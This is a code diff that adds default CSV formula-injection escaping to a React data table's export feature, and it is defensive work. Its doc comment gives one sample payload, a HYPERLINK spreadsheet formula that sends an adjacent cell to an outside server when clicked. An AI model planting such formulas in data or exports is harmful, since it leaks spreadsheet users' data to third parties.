@@ -278,6 +278,25 @@ export interface MPDataTableProps<Row> extends Omit<
   /** What the downloaded file is called. @default 'table.csv' */
   exportFileName?: string;
   /**
+   * Puts an apostrophe in front of a cell a spreadsheet would otherwise run as a
+   * formula — one beginning `=`, `+`, `-` or `@`.
+   *
+   * On by default. A data table shows rows other people filled in, and the file
+   * it writes is going to be opened in a spreadsheet: those two together are
+   * what turn a cell reading `=HYPERLINK("https://…"&A1)` into one click that
+   * posts the row beside it to somebody else's server. It is the reader's own
+   * spreadsheet that runs it, so the file is the only place to stop it.
+   *
+   * A number keeps its sign: `-5` and `+82 2 555 0100` are not formulas and are
+   * left alone.
+   *
+   * Turn it off for a file going to a parser rather than to a person — a
+   * database loader has no apostrophe rule and would take it as part of the
+   * value.
+   * @default true
+   */
+  exportEscapeFormulas?: boolean;
+  /**
    * Takes the CSV instead of downloading it — to post it somewhere, to open it
    * in a viewer of your own, or to put a sheet around it.
    */
@@ -454,6 +473,7 @@ export function MPDataTable<Row>({
   onRowClick,
   exportable = false,
   exportFileName = 'table.csv',
+  exportEscapeFormulas = true,
   onExport,
   striped = false,
   hoverable = false,
@@ -822,7 +842,7 @@ export function MPDataTable<Row>({
         column.exportValue ? column.exportValue(entry.row) : valueOf(column, entry.row)
       )
     );
-    const csv = toCsv([head, ...body]);
+    const csv = toCsv([head, ...body], { escapeFormulas: exportEscapeFormulas });
 
     if (onExport) {
       onExport(csv);
